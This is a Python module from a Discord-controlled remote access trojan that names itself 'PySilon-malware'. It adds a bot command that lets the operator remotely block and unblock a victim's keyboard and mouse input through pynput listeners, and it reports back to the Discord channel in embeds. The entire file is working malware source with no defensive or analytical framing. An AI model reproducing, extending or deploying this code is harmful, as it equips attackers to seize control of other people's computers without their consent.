#<imports>
from pynput import keyboard, mouse
import discord
#</imports>

#<preload>
input_blocked = None
keyboard_listener = None
mouse_listener = None
#</preload>

#<command>

@client.command(name="input")
async def block_input(ctx, argument=None):
    global input_blocked, keyboard_listener, mouse_listener
    if argument == "block":
        if not input_blocked:
            await ctx.message.delete()
            async def on_press(): pass
            async def on_release(): pass
            async def on_click():pass

            keyboard_listener = keyboard.Listener(suppress=True)
            mouse_listener = mouse.Listener(suppress=True)
            keyboard_listener.start()
            mouse_listener.start()

            embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .input unblock```',colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            input_blocked = True
        else:
            embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is already blocked. Unblock it by using .input unblock```',colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    elif argument == "unblock":
        if input_blocked:
            await ctx.message.delete()
            keyboard_listener.stop()
            mouse_listener.stop()

            embed = discord.Embed(title="🟢 Input Unblocked",description=f'```Input has been unblocked. Block it by using .input block```',colour=discord.Colour.green())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
            input_blocked = False
        else:
            embed = discord.Embed(title="🔴 Hold on!",description=f'```The input is not blocked. Block it by using .input block```',colour=discord.Colour.red())
            embed.set_author(name="PySilon-malware",icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="📛 Error",description='```Syntax: .input <block / unblock>```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await ctx.send(embed=embed)
#</command>